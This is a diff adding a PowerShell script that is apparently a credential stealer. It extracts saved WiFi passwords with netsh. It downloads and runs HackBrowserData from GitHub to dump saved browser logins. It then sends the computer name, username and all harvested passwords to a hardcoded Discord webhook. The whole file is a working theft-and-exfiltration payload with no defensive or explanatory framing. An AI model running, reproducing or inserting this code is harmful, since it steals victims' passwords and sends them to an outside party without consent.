@@ -1,0 +1,92 @@
+# Discord Webhook
+$webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZzei7XYF1JVmRx6hfSzMGx9PXOgC0Aawp4fIeN1E37Bd4OAfSJIGO0"
+
+# Get PC info
+$pc = "$env:COMPUTERNAME | $env:USERNAME"
+
+# === WiFi Passwords ===
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+$wifi = ""
+foreach($name in $wifiProfiles) {
+    $profileInfo = netsh wlan show profile name="$name" key=clear
+    $passLine = $profileInfo | Select-String "Key Content\W+\:(.+)$"
+    if($passLine) {
+        $pass = $passLine.Matches.Groups[1].Value.Trim()
+        $wifi += "$name : $pass`n"
+    }
+}
+if(-not $wifi) { $wifi = "No WiFi networks found" }
+
+# === Browser Passwords ===
+$tempDir = "$env:TEMP\hbd_$(Get-Random)"
+New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+
+try {
+    # Download HackBrowserData
+    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
+    $zipPath = "$tempDir\hbd.zip"
+    
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
+    
+    # Extract
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
+    
+    # Run HackBrowserData
+    $exePath = "$tempDir\hack-browser-data.exe"
+    if(Test-Path $exePath) {
+        & $exePath -b all -f json --dir $tempDir | Out-Null
+        Start-Sleep -Seconds 3
+        
+        # Read the password file
+        $jsonFile = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse | Select-Object -First 1
+        if($jsonFile) {
+            $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
+            $browsers = ""
+            foreach($item in $data) {
+                # Extract service name from URL
+                $service = "Unknown"
+                if($item.url -match "https?://(?:www\.)?([^/\.]+)\.[^/]+") {
+                    $service = $matches[1]
+                }
+                $browsers += "# $service`n$($item.url)`n  User: $($item.username)`n  Pass: $($item.password)`n`n"
+            }
+            if(-not $browsers) { $browsers = "No saved browser passwords found" }
+        } else {
+            $browsers = "No password data extracted"
+        }
+    } else {
+        $browsers = "Failed to extract HackBrowserData"
+    }
+} catch {
+    $browsers = "Error: $($_.Exception.Message)"
+}
+
+# Clean up
+Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+
+# === Format and Send ===
+$output = @"
+**PC: $pc**
+
+**=== WiFi Networks ===**
+$wifi
+
+**=== Browser Passwords ===**
+$browsers
+"@
+
+# Split into chunks if too long (Discord has 2000 char limit)
+$maxLen = 1900
+if($output.Length -gt $maxLen) {
+    for($i = 0; $i -lt $output.Length; $i += $maxLen) {
+        $chunk = $output.Substring($i, [Math]::Min($maxLen, $output.Length - $i))
+        $body = @{ content = $chunk } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+        Start-Sleep -Milliseconds 500
+    }
+} else {
+    $body = @{ content = $output } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+}
